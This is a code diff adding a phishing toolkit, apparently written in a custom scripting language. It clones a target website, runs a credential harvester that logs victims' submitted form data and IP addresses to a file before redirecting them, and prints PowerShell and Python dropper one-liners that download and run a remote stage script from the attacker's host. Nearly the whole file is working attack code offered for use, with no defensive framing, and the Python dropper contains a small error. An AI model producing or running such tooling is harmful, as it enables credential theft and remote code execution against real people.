@@ -1,0 +1,69 @@
+# koppa-phish v1.0 — Phishing toolkit
+# Usage: koppa run koppa-phish [clone|harvest|payload]
+
+import http, parse, sys, encode, log
+
+fn cmd_clone(url, outdir) {
+    log.info("===== Site Clone: {url} =====")
+    if not outdir { outdir = "/tmp/phish" }
+    sys.exec("mkdir -p {outdir}")
+    let resp = http.get(url)
+    let html = resp.body
+    sys.write_file("{outdir}/index.html", html)
+    log.success("[+] Cloned to {outdir}/index.html")
+    log.info("    Host with: python3 -m http.server 8080 -d {outdir}")
+}
+
+fn cmd_harvest(lhost, lport, redirect_url) {
+    log.info("===== Credential Harvester =====")
+    log.info("Listener: http://{lhost}:{lport}")
+    log.info("Redirect: {redirect_url}")
+    let server = "
+import http.server, urllib.parse, datetime
+REDIRECT='{redirect_url}'
+class H(http.server.BaseHTTPRequestHandler):
+    def do_POST(self):
+        n=int(self.headers.get('Content-Length',0)); b=self.rfile.read(n).decode()
+        t=datetime.datetime.now().strftime('%H:%M:%S')
+        print(f'[+] [{t}] {self.client_address[0]}: {urllib.parse.unquote(b)}')
+        open('/tmp/harvested.txt','a').write(f'{t}|{self.client_address[0]}|{b}\\n')
+        self.send_response(302); self.send_header('Location',REDIRECT); self.end_headers()
+    def log_message(self,*a):pass
+http.server.HTTPServer(('{lhost}',{lport}),H).serve_forever()
+"
+    sys.write_file("/tmp/harvester.py", server)
+    log.success("[+] Starting harvester (Ctrl+C to stop)...")
+    log.info("    Creds → /tmp/harvested.txt")
+    sys.exec("python3 /tmp/harvester.py")
+}
+
+fn cmd_payload(lhost, lport, ptype) {
+    log.info("===== Payload Delivery Link =====")
+    if ptype == "ps1" {
+        log.success("[PowerShell dropper]")
+        log.info("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/stage.ps1')\"")
+    }
+    if ptype == "python" {
+        log.success("[Python dropper]")
+        log.info("python3 -c \"import urllib.request,exec; exec(urllib.request.urlopen('http://{lhost}:{lport}/stage.py').read())\"")
+    }
+    if not ptype {
+        log.info("Specify type: ps1 | python")
+    }
+}
+
+fn main() {
+    let mode = __args__[0]
+    let arg1 = __args__[1]
+    let arg2 = __args__[2]
+    let arg3 = __args__[3]
+    log.info("===== KOPPA Phish Toolkit v1.0 =====")
+    if not mode {
+        log.warn("Usage: koppa run koppa-phish [clone <url>|harvest <lhost> <lport> <redirect>|payload <lhost> <lport> <type>]")
+        return
+    }
+    if mode == "clone"   { cmd_clone(arg1, arg2) }
+    if mode == "harvest" { cmd_harvest(arg1, arg2, arg3) }
+    if mode == "payload" { cmd_payload(arg1, arg2, arg3) }
+    log.success("Done!")
+}
